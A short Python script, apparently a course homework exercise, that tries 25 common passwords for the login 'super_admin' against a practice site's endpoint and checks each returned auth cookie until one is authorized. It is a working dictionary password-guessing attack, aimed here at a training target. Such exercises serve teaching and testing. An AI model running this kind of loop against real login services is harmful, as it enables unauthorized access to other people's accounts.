import requests

get_secret_password_url = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
check_auth_cookie_url = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"

login = "super_admin"

common_passwords = [
    "123456", "password", "123456789", "12345678", "12345",
    "1234567", "1234567890", "qwerty", "abc123", "111111",
    "123123", "admin", "letmein", "welcome", "monkey",
    "1234", "super_admin", "123", "dragon", "123321",
    "qwertyuiop", "123abc", "qwe123", "password1", "123qwe"
]

for password in common_passwords:
    response1 = requests.post(get_secret_password_url, data={"login": login, "password": password})
    auth_cookie = response1.cookies.get("auth_cookie")

    response2 = requests.get(check_auth_cookie_url, cookies={"auth_cookie": auth_cookie})

    if response2.text == "You are authorized":
        print(f"Верный пароль: {password}")
        print(f"Ответ от второго метода: {response2.text}")
        break
    else:
        print(f"Неверный пароль: {password}")
        print(f"Ответ от второго метода: {response2.text}")
